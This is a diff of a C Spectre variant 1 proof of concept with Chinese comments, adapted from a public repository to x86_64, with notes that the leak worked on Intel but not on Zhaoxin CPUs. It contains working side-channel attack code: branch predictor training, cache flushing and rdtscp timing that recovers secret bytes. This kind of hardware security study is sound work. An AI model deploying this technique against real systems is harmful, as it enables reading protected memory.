@@ -1,11 +1,16 @@
+/***********************************************************************
+ * 项目来自  https://github.com/crozone/SpectrePoC 
+ * 这里针对 x86_64 架构进行了修改
+ * 
+ * 实验结果: 在Intel 处理器上能够恢复密码数据，但在兆芯处理器上无法恢复。
+ * 
+***********************************************************************/
+
 #include <stdio.h>
 #include <stdint.h>
 #include <stdlib.h>
 #include <x86intrin.h> /* 需要支持 rdtsc, rdtscp, clflush, mfence*/
 
-/********************************************************************
-受害者代码
-********************************************************************/
 
 unsigned int array1_size = 16;
 uint8_t unused1[64]; //避免在同一个缓存行，缓存行大小一般是64字节
@@ -20,21 +25,12 @@ char *secret = "The Magic Words are Squeamish Ossifrage.";
 uint8_t temp = 0; /* 赋值，防止受害者函数被编译器优化 */
 
 
+
 /* 受害者函数 */
 void victim_function(size_t x) {
     if (x < array1_size) {
         temp &= array2[array1[x] * 512];
     }
-}
-
-uint64_t rdtsc()
-{
-    uint64_t a, d;
-    __asm__ volatile("mfence");
-    __asm__ volatile("rdtscp" : "=a"(a), "=d"(d) :: "rcx");
-      a = (d << 32) | a;
-    __asm__ volatile("mfence");
-    return a;
 }
 
 /* 读取缓存一个字节
@@ -63,17 +59,19 @@ void readMemoryByte(int cache_hit_threshold, size_t malicious_x, uint8_t value[2
     // 初始化
     for (i = 0; i < 256; i++) results[i] = 0;
 
+    
     for (tries = 999; tries > 0; tries--) {
         /* 把array2赶出缓存 */
-        for (i = 0; i < 256; i++){
-            _mm_clflush(&array2[i * 512]);
-        }
+
+        for (i = 0; i < 256; i++) _mm_clflush(&array2[i * 512]);
+        
 
         /* 训练分支预测器 */
         training_x = tries % array1_size; //正常访问
         for (j = 29; j >= 0; j--) {
             /* 将array1_size赶出缓存 防止推测时其在缓存 */
             _mm_clflush(&array1_size);
+            
 
             // 时间延迟（免优化）
             for (volatile int z = 0; z < 100; z++) {}
@@ -93,10 +91,10 @@ void readMemoryByte(int cache_hit_threshold, size_t malicious_x, uint8_t value[2
             mix_i = ((i * 167) + 13) & 255; //因为 167 与 256 互质，构成模 256 下的乘法置换，加 13 只是平移。能确保全排列
             addr = &array2[mix_i * 512];
 
-            time1 = rdtsc();
+            time1 = __rdtscp(&junk);
             junk = *addr; // 侧信道发生在这
-            time2 = rdtsc() - time1;
-
+            time2 = __rdtscp(&junk) - time1;
+            
             // 避免误报：array1[training_x] 对应的 array2[array1[training_x] * 512] 会被真实访问
             if ((int)time2 <= cache_hit_threshold && mix_i != array1[tries % array1_size])
                 results[mix_i]++;
@@ -115,7 +113,7 @@ void readMemoryByte(int cache_hit_threshold, size_t malicious_x, uint8_t value[2
         }
         // 早停，可以加快破解密码速度
         if (results[j] >= (2 * results[k] + 5) || (results[j] == 2 && results[k] == 0))
-            break;
+        break;
     }
 
     value[0] = (uint8_t)j;
@@ -133,9 +131,13 @@ int main(int argc, const char **argv) {
     int score[2];
     uint8_t value[2];
     int i;
-    
-    for (i = 0; i < (int)sizeof(array2); i++) {
-        array2[i] = 1; /* write to array2 so in RAM not copy-on-write zero pages */
+
+    for (i = 0; i < (int)sizeof(array2); i++){
+        array2[i] = 1;
+    }
+
+    if (argc >= 2){
+        sscanf(argv[1], "%d", &cache_hit_threshold);
     }
 
     printf("Using a cache hit threshold of %d.\n", cache_hit_threshold);
